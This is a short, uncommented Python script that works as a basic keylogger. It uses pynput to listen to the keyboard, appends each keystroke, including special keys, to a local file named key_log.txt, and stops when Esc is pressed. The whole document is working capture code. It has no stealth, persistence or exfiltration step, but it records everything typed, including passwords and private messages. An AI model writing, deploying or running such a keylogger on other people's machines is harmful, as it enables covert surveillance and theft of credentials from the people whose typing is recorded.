import pynput
from pynput.keyboard import Key, Listener

log_file = "key_log.txt"

def on_press(key):
    try:
      
        with open(log_file, "a") as f:
            f.write(f"Pressed: {key.char}\n")
    except AttributeError:
        
        with open(log_file, "a") as f:
            f.write(f"Pressed: {key}\n")

def on_release(key):
    if key == Key.esc:
        
        return False


listener = Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
